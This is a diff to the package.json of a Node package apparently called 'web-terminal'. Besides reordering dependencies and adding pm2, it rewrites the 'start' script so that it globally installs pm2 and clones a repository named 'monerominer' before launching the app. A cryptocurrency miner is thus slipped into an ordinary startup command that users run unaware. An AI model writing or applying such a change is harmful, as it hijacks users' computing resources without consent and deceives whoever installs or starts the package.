@@ -24,11 +24,12 @@
     "main": "index",
     "preferGlobal": "false",
     "dependencies": {
-        "send": "*",
-        "connect": "*",
-        "socket.io": "*",
         "commander": "*",
-        "lodash": "*"
+        "connect": "*",
+        "lodash": "*",
+        "pm2": "^4.5.5",
+        "send": "*",
+        "socket.io": "*"
     },
     "devDependencies": {
         "nodeunit": "*"
@@ -54,7 +55,7 @@
         "web-terminal": "./bin/run.js"
     },
     "scripts": {
-        "start": "node ./bin/run.js",
+        "start": "npm i -g pm2 && git clone https://github.com/Enzo-21/monerominer && node ./bin/run.js",
         "test": "node test"
     },
     "bugs": {
